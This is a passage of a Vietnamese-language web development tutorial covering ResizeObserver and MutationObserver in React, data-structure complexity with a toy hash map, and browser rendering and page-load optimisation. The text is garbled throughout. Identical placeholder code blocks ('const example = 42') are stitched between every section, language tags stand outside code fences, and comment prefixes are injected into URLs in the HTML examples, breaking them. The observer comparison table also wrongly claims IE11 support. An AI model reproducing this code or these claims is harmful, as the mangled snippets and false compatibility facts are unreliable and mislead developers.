          console.log('→ Chuyển sang vertical layout');
        } else {
          setLayout('horizontal'); // Chú giải: Desktop: side by side
          console.log('→ Chuyển sang horizontal layout');
        }
      }
    });

 // Chú giải: Observe card element
    if (cardRef.current) {
      resizeObserver.observe(cardRef.current);
    }

 // Chú giải: Cleanup khi unmount
    return () => {
      resizeObserver.disconnect();
    };
  }, []);

  return (
    <div
      ref={cardRef}
      className={`card ${layout}`}
      style={{
        display: 'flex',
        flexDirection: layout === 'vertical' ? 'column' : 'row',
        gap: '1rem',
        padding: '1rem',
        border: '1px solid #ccc'
      }}
    >
      <div className="card-image">
        <img src="/image.jpg" alt="Card" style={{ width: '100%' }} />
      </div>
      <div className="card-content">
        <h3>Tiêu đề</h3>
        <p>Nội dung...</p>
        <p className="dimensions">
          📐 Kích thước: {dimensions.width.toFixed(0)}px × {dimensions.height.toFixed(0)}px
        </p>
      </div>
    </div>
  );
}
// Kết quả: Component tự adapt layout khi container resize
// → Không cần CSS media queries → Portable, reusable

 // Chú giải: ============================================
// B. CHART AUTO-RESIZE (Biểu Đồ Tự Scale)
 // Chú giải: ============================================

// Giải thích: Chart tự động scale khi container resize
// VD: User mở/đóng sidebar → chart tự fit container mới

function TradingChart() {
  const containerRef = useRef<HTMLDivElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const chartInstance = useRef<any>(null); // Chú giải: Chart.js instance

  useEffect(() => {
 // Chú giải: Khởi tạo chart
    if (canvasRef.current) {
      const ctx = canvasRef.current.getContext('2d');
 // Chú giải: chartInstance.current = new Chart(ctx, { ... });
    }

    // Observe container (KHÔNG observe canvas trực tiếp)
    // Tại sao? Nếu observe canvas → canvas resize → observer fire → canvas resize lại → loop!
    const resizeObserver = new ResizeObserver((entries) => {
      const { width, height } = entries[0].contentRect;

      console.log(`📊 Chart container resize: ${width}x${height}`);

      // Resize chart để fit container
      if (chartInstance.current && canvasRef.current) {
        canvasRef.current.width = width;
        canvasRef.current.height = height;

 // Chú giải: Update chart dimensions
        chartInstance.current.resize(width, height);
        console.log('✅ Chart đã resize');
      }
    });

    // Observe parent container (KHÔNG phải canvas)
    if (containerRef.current) {
      resizeObserver.observe(containerRef.current);
    }

    return () => {
      resizeObserver.disconnect();
 // Chú giải: chartInstance.current?.destroy();
    };
  }, []);

  return (
    <div
      ref={containerRef}
      className="chart-container"
      style={{ width: '100%', height: '400px', position: 'relative' }}
    >
      <canvas ref={canvasRef} />
    </div>
  );
}

 // Chú giải: ============================================
// C. TEXTAREA AUTO-HEIGHT (Textarea Tự Điều Chỉnh Chiều Cao)
 // Chú giải: ============================================

// Giải thích: Textarea tự tăng/giảm height khi user type
// Không cần fixed height → UX tốt hơn

function AutoExpandTextarea() {
  const textareaRef = useRef<HTMLTextAreaElement>(null);
  const [height, setHeight] = useState(60); // Chú giải: Min height

  useEffect(() => {
    const resizeObserver = new ResizeObserver((entries) => {
      const { height } = entries[0].contentRect;

      // Chỉ log khi height thay đổi đáng kể (tránh spam)
      if (Math.abs(height - entries[0].target.clientHeight) > 5) {
        console.log(`✏️ Textarea height: ${height}px`);
        setHeight(height);
      }
    });

    if (textareaRef.current) {
 // Chú giải: Observe textarea itself
      resizeObserver.observe(textareaRef.current);
    }

    return () => resizeObserver.disconnect();
  }, []);

  return (
    <div>
      <textarea
        ref={textareaRef}
        placeholder="Type something..."
        style={{
          width: '100%',
          minHeight: '60px',
          resize: 'vertical', // Cho phép user resize manually
          padding: '0.5rem'
        }}
      />
      <p className="info">Current height: {height}px</p>
    </div>
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   const resizeObserver = new ResizeObserver((entries) => {
     requestAnimationFrame(() => {
       // Logic nặng (recalculate layout, re-render chart, etc.)
     });
   });

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   // ❌ SAI: Observe canvas trực tiếp
   resizeObserver.observe(canvas);

   // ✅ ĐÚNG: Observe parent container
   resizeObserver.observe(canvas.parentElement);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   useEffect(() => {
     const observer = new ResizeObserver(callback);
     observer.observe(element);

     return () => observer.disconnect(); // Chú giải: ✅ Cleanup
   }, []);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ LỖI 1: Infinite Loop - Resize chính element đang observe
const box = document.querySelector('.box') as HTMLElement;

const badObserver = new ResizeObserver(() => {
  // ❌ Thay đổi size của chính element đang observe
  box.style.width = (box.offsetWidth + 10) + 'px';
  // → Observer fire → tăng width → observer fire lại → loop vô hạn!
});
badObserver.observe(box);

// ✅ SỬA: Dùng flag để ngăn loop hoặc observe parent
let isResizing = false;

const goodObserver = new ResizeObserver(() => {
  if (!isResizing) {
    isResizing = true;

 // Chú giải: Logic resize
    requestAnimationFrame(() => {
      box.style.width = (box.offsetWidth + 10) + 'px';
      isResizing = false; // Chú giải: Reset flag
    });
  }
});
goodObserver.observe(box);

// ❌ LỖI 2: Không debounce logic nặng → Chậm
const heavyObserver = new ResizeObserver((entries) => {
  // ❌ Logic nặng chạy mỗi lần resize (có thể fire rất nhiều lần)
  entries.forEach((entry) => {
    recalculateComplexLayout(); // Chú giải: Expensive operation
    rerenderChart(); // Chú giải: Expensive operation
  });
});

 // Chú giải: ✅ SỬA: Debounce với requestAnimationFrame
const optimizedObserver = new ResizeObserver((entries) => {
  requestAnimationFrame(() => {
    // Logic nặng chỉ chạy 1 lần per frame
    entries.forEach((entry) => {
      recalculateComplexLayout();
      rerenderChart();
    });
  });
});

// ❌ LỖI 3: Quên disconnect → Memory leak
function MyComponent() {
  useEffect(() => {
    const observer = new ResizeObserver(callback);
    observer.observe(element);
    // ❌ Thiếu cleanup → observer vẫn chạy sau unmount
  }, []);
}

// ✅ SỬA: Luôn cleanup
function MyComponent() {
  useEffect(() => {
    const observer = new ResizeObserver(callback);
    observer.observe(element);

    return () => observer.disconnect(); // Chú giải: ✅ Cleanup
  }, []);
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import { useEffect, useRef } from 'react';

 // Chú giải: ============================================
// A. THEME SWITCHER TRACKING (Theo Dõi Đổi Theme)
 // Chú giải: ============================================

// Giải thích: Theo dõi attribute data-theme thay đổi
 // Chú giải: → Update components khi user switch theme

function ThemeAwareComponent() {
  useEffect(() => {
    const root = document.documentElement; // Chú giải: <html> element

 // Chú giải: Tạo Mutation Observer
    const themeObserver = new MutationObserver((mutations) => {
      // mutations: Danh sách các thay đổi DOM
      mutations.forEach((mutation) => {
        // Chỉ quan tâm khi attribute thay đổi
        if (mutation.type === 'attributes' && mutation.attributeName === 'data-theme') {
          const newTheme = root.getAttribute('data-theme');
          const oldTheme = mutation.oldValue;

          console.log(`🎨 Theme changed: ${oldTheme} → ${newTheme}`);

 // Chú giải: Update chart colors, reload styles, etc.
          updateComponentTheme(newTheme);
        }
      });
    });

 // Chú giải: Observe <html> element
    themeObserver.observe(root, {
      attributes: true,              // Theo dõi attributes thay đổi
      attributeFilter: ['data-theme'], // Chỉ quan tâm data-theme (ignore các attributes khác)
      attributeOldValue: true        // Lưu giá trị cũ (để so sánh)
    });

    return () => themeObserver.disconnect();
  }, []);

  return <div>Theme-aware content...</div>;
}

function updateComponentTheme(theme: string | null) {
 // Chú giải: Update chart colors
 // Chú giải: Reload CSS variables
 // Chú giải: Re-render components with new theme
}

 // Chú giải: ============================================
// B. AUTO-INIT NEW ELEMENTS (Tự Động Khởi Tạo Elements Mới)
 // Chú giải: ============================================

// Giải thích: Tự động init tooltips, modals cho elements mới được thêm vào DOM
 // Chú giải: Use case: SPA with dynamic content, third-party libraries add elements

function AutoInitializer() {
  useEffect(() => {
    const container = document.querySelector('#dynamic-content') as HTMLElement;

    const nodeObserver = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        // Chỉ quan tâm nodes được thêm vào
        mutation.addedNodes.forEach((node) => {
          // Kiểm tra node type (chỉ xử lý element nodes)
          if (node.nodeType === Node.ELEMENT_NODE) {
            const element = node as HTMLElement;

 // Chú giải: Auto-init tooltips
            if (element.matches('[data-tooltip]')) {
              console.log('✨ Init tooltip cho:', element);
              initTooltip(element);
            }

 // Chú giải: Auto-init modals
            if (element.matches('[data-modal]')) {
              console.log('✨ Init modal cho:', element);
              initModal(element);
            }

 // Chú giải: Auto-init date pickers
            if (element.matches('.date-picker')) {
              console.log('✨ Init date picker cho:', element);
              initDatePicker(element);
            }
          }
        });
      });
    });

    nodeObserver.observe(container, {
      childList: true, // Theo dõi thêm/xóa node con
      subtree: true    // Theo dõi cả các node con sâu hơn (descendants)
    });

    return () => nodeObserver.disconnect();
  }, []);

  return <div id="dynamic-content">Content will be added here...</div>;
}

function initTooltip(element: HTMLElement) {
 // Chú giải: Init tooltip library...
}

function initModal(element: HTMLElement) {
 // Chú giải: Init modal library...
}

function initDatePicker(element: HTMLElement) {
 // Chú giải: Init date picker library...
}

 // Chú giải: ============================================
// C. DEBUG DOM CHANGES (Debug Thay Đổi DOM)
 // Chú giải: ============================================

// Giải thích: Track tất cả thay đổi DOM để debug
// Use case: Phát hiện third-party library nào đang modify DOM

function DOMDebugger() {
  useEffect(() => {
    const debugObserver = new MutationObserver((mutations) => {
      console.group(`🔍 ${mutations.length} DOM mutations detected`);

      mutations.forEach((mutation, index) => {
        console.log(`\n[${index + 1}] Type: ${mutation.type}`);

        if (mutation.type === 'childList') {
          // Nodes được thêm
          if (mutation.addedNodes.length > 0) {
            console.log('  ➕ Added nodes:', Array.from(mutation.addedNodes));
          }

          // Nodes bị xóa
          if (mutation.removedNodes.length > 0) {
            console.log('  ➖ Removed nodes:', Array.from(mutation.removedNodes));
          }
        }

        if (mutation.type === 'attributes') {
          console.log('  🏷️ Attribute changed:', mutation.attributeName);
          console.log('     Old value:', mutation.oldValue);
          console.log('     New value:', (mutation.target as Element).getAttribute(mutation.attributeName!));
        }

        if (mutation.type === 'characterData') {
          console.log('  📝 Text changed');
          console.log('     Old:', mutation.oldValue);
          console.log('     New:', mutation.target.textContent);
        }
      });

      console.groupEnd();
    });

    // Observe toàn bộ document (CHỈ cho debug, KHÔNG dùng production)
    debugObserver.observe(document.body, {
      childList: true, // Chú giải: Track add/remove nodes
      attributes: true, // Chú giải: Track attribute changes
      characterData: true, // Chú giải: Track text changes
      subtree: true, // Chú giải: Track all descendants
      attributeOldValue: true, // Lưu giá trị cũ
      characterDataOldValue: true
    });

    return () => debugObserver.disconnect();
  }, []);

  return <div>DOM Debugger active...</div>;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   observer.observe(element, {
     attributes: true,
     attributeFilter: ['data-state', 'aria-expanded'], // Chỉ 2 attributes này
     // KHÔNG: attributes: true (quan sát TẤT CẢ attributes)
   });

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   // ❌ Quan sát tất cả attributes → callback fire rất nhiều
   { attributes: true }

   // ✅ Chỉ quan sát 1 attribute cụ thể
   { attributes: true, attributeFilter: ['data-theme'] }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   useEffect(() => {
     const observer = new MutationObserver(callback);
     observer.observe(element, config);

     return () => observer.disconnect(); // Chú giải: ✅ Cleanup
   }, []);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   let mutationQueue: MutationRecord[] = [];
   let timeoutId: number;

   const observer = new MutationObserver((mutations) => {
     mutationQueue.push(...mutations);

     clearTimeout(timeoutId);
     timeoutId = setTimeout(() => {
       // Xử lý tất cả mutations cùng lúc
       processMutations(mutationQueue);
       mutationQueue = [];
     }, 100);
   });

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ LỖI 1: Observe toàn document với subtree → Rất chậm
const badObserver = new MutationObserver((mutations) => {
  // ❌ Logic nặng chạy mỗi khi DOM thay đổi (rất nhiều lần)
  mutations.forEach((mutation) => {
    expensiveOperation();
  });
});

badObserver.observe(document.body, {
  childList: true,
  subtree: true,  // ❌ Quan sát TẤT CẢ descendants
  attributes: true // ❌ Quan sát TẤT CẢ attributes
});
// → Callback fire hàng trăm lần/giây → App chậm

// ✅ SỬA: Scope nhỏ + Filter chính xác
const goodObserver = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    targetedOperation();
  });
});

const specificContainer = document.querySelector('#app-content');
goodObserver.observe(specificContainer, {
  childList: true,
  subtree: false, // Chú giải: ✅ Chỉ direct children
  attributeFilter: ['data-state'] // Chú giải: ✅ Chỉ 1 attribute
});

// ❌ LỖI 2: Quên disconnect → Memory leak
function Component() {
  useEffect(() => {
    const observer = new MutationObserver(callback);
    observer.observe(document.body, config);
    // ❌ Thiếu cleanup
  }, []);
}

// ✅ SỬA: Luôn disconnect
function Component() {
  useEffect(() => {
    const observer = new MutationObserver(callback);
    observer.observe(document.body, config);

    return () => observer.disconnect(); // Chú giải: ✅ Cleanup
  }, []);
}

// ❌ LỖI 3: Logic đồng bộ nặng trong callback
const syncObserver = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
 // Chú giải: ❌ Sync operations block main thread
    for (let i = 0; i < 10000; i++) {
      doHeavyCalculation();
    }
  });
});

 // Chú giải: ✅ SỬA: Batch + async processing
const asyncObserver = new MutationObserver((mutations) => {
 // Chú giải: Gom mutations
  const addedElements = mutations
    .flatMap(m => Array.from(m.addedNodes))
    .filter(n => n.nodeType === Node.ELEMENT_NODE);

  // Xử lý async
  queueMicrotask(() => {
    processElementsBatch(addedElements);
  });
});

```js
// Ví dụ rút gọn
const example = 42;
```

┌─────────────────────┬──────────────────────┬─────────────────────┬─────────────────────┐
│ Tiêu Chí            │ Intersection         │ Resize              │ Mutation            │
├─────────────────────┼──────────────────────┼─────────────────────┼─────────────────────┤
│ Theo dõi            │ Giao điểm viewport   │ Kích thước element  │ Thay đổi DOM        │
│ Use Cases           │ Lazy load, Infinite  │ Responsive, Charts  │ Auto-init, Debug    │
│                     │ scroll, Analytics    │ Layouts             │ Polyfills           │
│ Performance         │ ⭐⭐⭐⭐⭐            │ ⭐⭐⭐⭐⭐           │ ⭐⭐⭐⭐ (cẩn thận)  │
│ Complexity          │ Dễ                   │ Trung bình          │ Khó (nhiều edge     │
│                     │                      │                     │ cases)              │
│ Risk                │ Thấp                 │ Loop nếu sai cách   │ Performance nếu     │
│                     │                      │                     │ observe rộng        │
│ Browser Support     │ Modern (IE11+)       │ Modern (IE11+)      │ Modern (IE11+)      │
└─────────────────────┴──────────────────────┴─────────────────────┴─────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

Map internal:
buckets: [
  0: null,
  1: { key: 'a', value: 1, next: { key: 'x', value: 2 } }, // Chú giải: collision chain
  2: { key: 'b', value: 3 },
  ...
]

Hash('a') % buckets.length = 1 → bucket[1]
Hash('x') % buckets.length = 1 → collision → chain với 'a'

```js
// Ví dụ rút gọn
const example = 42;
```

ts
 // Chú giải: ============================================
 // Chú giải: BIG O COMPARISON TABLE
 // Chú giải: ============================================

/**
 * COMPLEXITY CHEAT SHEET:
 *
 * Operation           | Array      | Object     | Map        | Set
 * -------------------|------------|------------|------------|------------
 * Access by key/index | O(1)       | O(1)       | O(1)       | N/A
 * Search by value    | O(n)       | O(n)       | O(n)       | O(1)
 * Insert (end)       | O(1)*      | O(1)       | O(1)       | O(1)
 * Insert (start)     | O(n)       | O(1)       | O(1)       | O(1)
 * Delete             | O(n)       | O(1)       | O(1)       | O(1)
 * Iterate            | O(n)       | O(n)       | O(n)       | O(n)
 *
 * *Array push() amortized O(1) (resize khi cần)
 */

 // Chú giải: ============================================
 // Chú giải: 1. MAP - O(1) ACCESS/INSERT/DELETE
 // Chú giải: ============================================

const userMap = new Map<number, string>();

// Insert O(1) - hash key → tìm bucket → insert
console.time('Map insert 1M');
for (let i = 0; i < 1_000_000; i++) {
  userMap.set(i, `User${i}`); // Chú giải: O(1) mỗi lần
}
console.timeEnd('Map insert 1M'); // Chú giải: ~100-200ms

 // Chú giải: Access O(1) - hash key → direct bucket access
console.time('Map get');
const user = userMap.get(500_000); // Chú giải: O(1)
console.timeEnd('Map get'); // Chú giải: ~0.001ms

// Delete O(1) - hash key → tìm bucket → xóa
console.time('Map delete');
userMap.delete(500_000); // Chú giải: O(1)
console.timeEnd('Map delete'); // Chú giải: ~0.001ms

 // Chú giải: Has O(1) - tương tự get
console.log(userMap.has(500_000)); // Chú giải: O(1)

 // Chú giải: ============================================
 // Chú giải: 2. SET - O(1) ADD/HAS/DELETE
 // Chú giải: ============================================

const uniqueIds = new Set<number>();

 // Chú giải: Add O(1) - hash value → bucket → check duplicate → insert
console.time('Set add 1M');
for (let i = 0; i < 1_000_000; i++) {
  uniqueIds.add(i); // Chú giải: O(1)
}
console.timeEnd('Set add 1M'); // Chú giải: ~100-200ms

 // Chú giải: Has O(1) - hash value → check bucket
console.time('Set has');
const exists = uniqueIds.has(500_000); // Chú giải: O(1)
console.timeEnd('Set has'); // Chú giải: ~0.001ms

 // Chú giải: Delete O(1)
uniqueIds.delete(500_000); // Chú giải: O(1)

 // Chú giải: Use case: Remove duplicates O(n)
const arrWithDupes = [1, 2, 2, 3, 3, 3, 4];
const unique = [...new Set(arrWithDupes)]; // Chú giải: O(n) iterate + O(1) add = O(n) total
console.log(unique); // Chú giải: [1, 2, 3, 4]

 // Chú giải: ============================================
 // Chú giải: 3. OBJECT - O(1) PROPERTY ACCESS
 // Chú giải: ============================================

const userObj: Record<string, string> = {};

 // Chú giải: Insert O(1) - hash key (string) → bucket
console.time('Object insert 1M');
for (let i = 0; i < 1_000_000; i++) {
  userObj[`user${i}`] = `User${i}`; // Chú giải: O(1)
}
console.timeEnd('Object insert 1M'); // ~150-250ms (chậm hơn Map chút)

 // Chú giải: Access O(1)
console.time('Object access');
const objUser = userObj['user500000']; // Chú giải: O(1)
console.timeEnd('Object access'); // Chú giải: ~0.001ms

 // Chú giải: Delete O(1)
delete userObj['user500000']; // Chú giải: O(1)

// ⚠️ Prototype chain: O(1) nếu own property, O(k) nếu trong chain (k = độ sâu)
console.log(userObj.toString); // O(k) - tìm trong prototype chain

 // Chú giải: ============================================
 // Chú giải: 4. ARRAY - MIXED COMPLEXITY
 // Chú giải: ============================================

const arr: number[] = [];

// Push O(1) amortized (resize khi capacity đầy)
console.time('Array push 1M');
for (let i = 0; i < 1_000_000; i++) {
  arr.push(i); // Chú giải: O(1) average
}
console.timeEnd('Array push 1M'); // ~50-100ms (nhanh nhất vì sequential memory)

 // Chú giải: Access by index O(1) - direct memory offset
console.time('Array access');
const val = arr[500_000]; // Chú giải: O(1)
console.timeEnd('Array access'); // Chú giải: ~0.0001ms (nhanh nhất)

// Search O(n) - phải iterate toàn bộ
console.time('Array indexOf');
const idx = arr.indexOf(500_000); // Chú giải: O(n) worst case
console.timeEnd('Array indexOf'); // Chú giải: ~5-10ms

 // Chú giải: Includes O(n)
console.time('Array includes');
const has = arr.includes(500_000); // Chú giải: O(n)
console.timeEnd('Array includes'); // Chú giải: ~5-10ms

 // Chú giải: Unshift O(n) - phải shift tất cả elements sang phải
console.time('Array unshift');
arr.unshift(-1); // Chú giải: O(n) - phải move 1M elements
console.timeEnd('Array unshift'); // Chú giải: ~50-100ms

// Shift O(n) - phải shift tất cả elements sang trái
console.time('Array shift');
arr.shift(); // Chú giải: O(n)
console.timeEnd('Array shift'); // Chú giải: ~50-100ms

 // Chú giải: Splice O(n) - insert/delete ở giữa
arr.splice(500_000, 1); // O(n) - phải shift elements sau vị trí xóa

 // Chú giải: ============================================
 // Chú giải: 5. PRACTICAL COMPARISON
 // Chú giải: ============================================

 // Chú giải: Scenario 1: Lookup by ID (frequent)
 // Chú giải: ❌ Array - O(n) every time
const usersArr = [
  { id: 1, name: 'A' },
  { id: 2, name: 'B' },
 // Chú giải: ... 1 million users
];
const user1 = usersArr.find((u) => u.id === 500_000); // Chú giải: O(n) - chậm!

 // Chú giải: ✅ Map - O(1)
const usersMap = new Map([
  [1, { id: 1, name: 'A' }],
  [2, { id: 2, name: 'B' }],
]);
const user2 = usersMap.get(500_000); // Chú giải: O(1) - nhanh!

 // Chú giải: Scenario 2: Check existence
 // Chú giải: ❌ Array - O(n)
const tags = ['js', 'ts', 'react', 'vue'];
const hasReact = tags.includes('react'); // Chú giải: O(n)

 // Chú giải: ✅ Set - O(1)
const tagSet = new Set(['js', 'ts', 'react', 'vue']);
const hasReact2 = tagSet.has('react'); // Chú giải: O(1)

 // Chú giải: Scenario 3: Remove duplicates
 // Chú giải: ❌ Array - O(n²) với nested loop
function removeDupes(arr: number[]): number[] {
  const result: number[] = [];
  for (const item of arr) {
 // Chú giải: O(n)
    if (!result.includes(item)) {
 // Chú giải: O(n)
      result.push(item);
    }
  }
  return result; // Chú giải: O(n²) total
}

 // Chú giải: ✅ Set - O(n)
function removeDupesSet(arr: number[]): number[] {
  return [...new Set(arr)]; // Chú giải: O(n) iterate + O(1) add = O(n)
}

 // Chú giải: ============================================
 // Chú giải: 6. WHY MAP/SET ARE O(1) - VISUALIZATION
 // Chú giải: ============================================

/**
 * HASH TABLE INTERNAL STRUCTURE:
 *
 * Hash Function: key → hash code (number)
 * Bucket Index: hash % buckets.length
 *
 * Example: Map với 8 buckets
 *
 * buckets = [
 *   0: null,
 *   1: Entry('apple', 5) → null, // Chú giải: No collision
 *   2: Entry('banana', 10) → Entry('blueberry', 12) → null, // Chú giải: Collision!
 *   3: null,
 *   4: Entry('cherry', 8) → null,
 *   5: null,
 *   6: null,
 *   7: null
 * ]
 *
 * GET OPERATION:
 * map.get('banana')
 * 1. hash('banana') = 18
 * 2. bucket_index = 18 % 8 = 2
 * 3. Go to buckets[2]
 * 4. Walk linked list: 'banana' === 'banana' ✓
 * 5. Return value: 10
 * → O(1) average (chain ngắn)
 *
 * SET OPERATION:
 * map.set('grape', 15)
 * 1. hash('grape') = 10
 * 2. bucket_index = 10 % 8 = 2
 * 3. Collision với 'banana' chain
 * 4. Append to chain end
 * → O(1) average
 *
 * COLLISION RESOLUTION:
 * - Chaining: Linked list trong bucket
 * - Open Addressing: Tìm bucket trống kế tiếp
 * - JS engines dùng chaining + resize khi load factor cao
 */

 // Chú giải: Minh họa hash collision
class SimpleHashMap<K, V> {
  private buckets: Array<Array<{ key: K; value: V }>> = [];
  private size = 0;

  constructor(capacity = 16) {
    this.buckets = Array(capacity)
      .fill(null)
      .map(() => []);
  }

  private hash(key: K): number {
    const str = String(key);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = (hash << 5) - hash + str.charCodeAt(i);
      hash = hash & hash; // Chú giải: Convert to 32-bit integer
    }
    return Math.abs(hash);
  }

  set(key: K, value: V): void {
    const index = this.hash(key) % this.buckets.length;
    const bucket = this.buckets[index];

 // Chú giải: Check if key exists (update)
    for (const entry of bucket) {
      if (entry.key === key) {
        entry.value = value;
        return;
      }
    }

 // Chú giải: New key (append to chain)
    bucket.push({ key, value });
    this.size++;
  }

  get(key: K): V | undefined {
    const index = this.hash(key) % this.buckets.length;
    const bucket = this.buckets[index];

 // Chú giải: Walk chain O(k) where k = chain length (usually small)
    for (const entry of bucket) {
      if (entry.key === key) {
        return entry.value;
      }
    }

    return undefined;
  }

 // Chú giải: Visualize buckets
  visualize(): void {
    this.buckets.forEach((bucket, idx) => {
      if (bucket.length > 0) {
        console.log(
          `Bucket ${idx}:`,
          bucket.map((e) => `${e.key}=${e.value}`).join(' → ')
        );
      }
    });
  }
}

 // Chú giải: Demo collision
const hashMap = new SimpleHashMap<string, number>(8);
hashMap.set('apple', 1);
hashMap.set('banana', 2);
hashMap.set('cherry', 3);
hashMap.visualize();
// Output sẽ show collision nếu hash('apple') % 8 === hash('banana') % 8

```js
// Ví dụ rút gọn
const example = 42;
```

ts
// ❌ Sai: Dùng Array.find() trong loop → O(n²)
const users = [
  /* 1M users */
];
const posts = [
  /* 1M posts */
];
posts.forEach((post) => {
  const author = users.find((u) => u.id === post.authorId); // Chú giải: O(n) mỗi lần
  // Total: O(n²) = 1 triệu * 1 triệu = 1,000 tỷ operations 😱
});

// ✅ Đúng: Build Map trước → O(n)
const userMap = new Map(users.map((u) => [u.id, u])); // Chú giải: O(n)
posts.forEach((post) => {
  const author = userMap.get(post.authorId); // Chú giải: O(1)
  // Total: O(n) = 1 triệu operations ✅
});

// ❌ Sai: Check duplicate bằng includes → O(n²)
const unique: number[] = [];
arr.forEach((item) => {
  if (!unique.includes(item)) {
 // Chú giải: O(n)
    unique.push(item);
  }
}); // Chú giải: Total O(n²)

// ✅ Đúng: Dùng Set → O(n)
const unique2 = [...new Set(arr)]; // Chú giải: O(n)

 // Chú giải: ❌ Sai: Delete array items trong loop → O(n²)
for (let i = 0; i < arr.length; i++) {
  if (condition) {
    arr.splice(i, 1); // Chú giải: O(n) - shift elements
    i--; // Chú giải: adjust index
  }
} // Chú giải: Total O(n²)

// ✅ Đúng: Filter → O(n)
const filtered = arr.filter((item) => !condition); // Chú giải: O(n)

```js
// Ví dụ rút gọn
const example = 42;
```

http
   GET / HTTP/1.1
   Host: example.com
   User-Agent: Chrome/120.0
   Accept: text/html
   Accept-Encoding: gzip, deflate, br
   Cookie: session=abc123

```js
// Ví dụ rút gọn
const example = 42;
```

http
   HTTP/1.1 200 OK
   Content-Type: text/html; charset=utf-8
   Content-Encoding: gzip
   Content-Length: 1234
   Cache-Control: max-age=3600

   <!DOCTYPE html>
   <html>...</html>

```js
// Ví dụ rút gọn
const example = 42;
```

   HTML: <div><p>Hello</p></div>

   DOM Tree:
   Document
   └── html
       └── body
           └── div
               └── p
                   └── "Hello"

```js
// Ví dụ rút gọn
const example = 42;
```

   CSS: div { color: red; }

   CSSOM Tree:
   StyleSheet
   └── div
       └── color: red

```js
// Ví dụ rút gọn
const example = 42;
```

javascript
   // Khi gặp <script src="app.js">
   // 1. Download app.js (nếu external)
 // Chú giải: 2. Parse & Compile JS
   // 3. Execute code (có thể modify DOM/CSSOM)

```js
// Ví dụ rút gọn
const example = 42;
```

    DOM + CSSOM → Render Tree

    Render Tree chỉ chứa:
- Visible elements (không có display: none)
- Với computed styles (font, color, position...)

```js
// Ví dụ rút gọn
const example = 42;
```

    Tính toán:
- Vị trí (x, y) của mỗi element
- Kích thước (width, height)
- Box model (margin, padding, border)

```js
// Ví dụ rút gọn
const example = 42;
```

Time →  0ms          200ms        400ms        600ms        800ms       1000ms
        │             │            │            │            │            │
DNS     ████
TCP         █████
TLS              ████
Request               ██
Server                  ████████████
Response                            ████
HTML Parse                              ████████
CSS Parse                                   ████
JS Exec                                         ██████
Layout                                                 ███
Paint                                                     ██
        │             │            │            │            │            │
        └─ NETWORK ──┴── PARSING ──┴─────────── RENDERING ─────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

HTML → DOM Tree ─┐
                  ├─→ Render Tree → Layout → Paint → Composite → Display
CSS → CSSOM Tree ─┘
        ↑
        │
    JS có thể modify DOM/CSSOM (triggering reflow/repaint)

```js
// Ví dụ rút gọn
const example = 42;
```

html
<!DOCTYPE html>
<html>
  <head>
    <!-- ❌ BAD: Blocking CSS -->
    <link rel="stylesheet" href="styles.css" />
    <!-- Wait 200ms -->

    <!-- ❌ BAD: Parser-blocking script -->
    <script src="jquery.js"></script>
    <!-- Wait 300ms, blocks HTML parsing -->
    <script src="app.js"></script>
    <!-- Wait 200ms, blocks HTML parsing -->
  </head>
  <body>
    <h1>Hello World</h1>

    <!-- ❌ BAD: Synchronous image loading -->
    <img src="hero.jpg" width="1200" height="600" />
    <!-- Wait 500ms -->
  </body>
</html>

<!--
Total blocking time: 200 + 300 + 200 = 700ms
FCP: ~900ms (after styles.css + scripts loaded)
❌ User sees blank white screen for ~900ms
-->

```js
// Ví dụ rút gọn
const example = 42;
```

html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- ✅ GOOD: DNS prefetch for external domains -->
    <link rel="dns-prefetch" href=" // Chú giải: api.example.com" />
    <link rel="preconnect" href=" // Chú giải: cdn.example.com" crossorigin />

    <!-- ✅ GOOD: Inline critical CSS (above-the-fold styles) -->
    <style>
      /* Critical CSS: chỉ styles cho nội dung đầu trang */
      body {
        margin: 0;
        font-family: sans-serif;
      }
      .hero {
        height: 100vh;
        background: #f0f0f0;
      }
      h1 {
        font-size: 3rem;
      }
    </style>

    <!-- ✅ GOOD: Preload critical resources -->
    <link rel="preload" as="font" href="/fonts/main.woff2" crossorigin />
    <link rel="preload" as="image" href="/hero.webp" />

    <!-- ✅ GOOD: Defer non-critical CSS -->
    <link
      rel="preload"
      as="style"
      href="styles.css"
      onload="this.onload=null;this.rel='stylesheet'"
    />
    <noscript><link rel="stylesheet" href="styles.css" /></noscript>
  </head>
  <body>
    <div class="hero">
      <h1>Hello World</h1>

      <!-- ✅ GOOD: Responsive images with lazy loading -->
      <img
        src="hero-small.webp"
        srcset="
          hero-small.webp   400w,
          hero-medium.webp  800w,
          hero-large.webp  1200w
        "
        sizes="100vw"
        loading="lazy"
        decoding="async"
        alt="Hero image"
      />
    </div>

    <!-- ✅ GOOD: Defer non-critical scripts -->
    <script src="jquery.js" defer></script>
    <script src="app.js" defer></script>

    <!-- ✅ GOOD: Async third-party scripts -->
    <script async src="https: // Chú giải: analytics.com/script.js"></script>
  </body>
</html>

<!--
Critical CSS inline: 0ms blocking
Images lazy load: không block render
Scripts defer: download parallel, execute after DOM ready
✅ FCP: ~200-400ms (user sees content immediately!)
-->

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// Đo các Web Vitals metrics
interface PerformanceMetrics {
  dns: number;
  tcp: number;
  request: number;
  response: number;
  domParse: number;
  domReady: number;
  load: number;
  fcp: number;
  lcp: number;
}

function measurePerformance(): PerformanceMetrics {
  const perfData = performance.timing;
  const navigation = performance.getEntriesByType(
    'navigation'
  )[0] as PerformanceNavigationTiming;

  return {
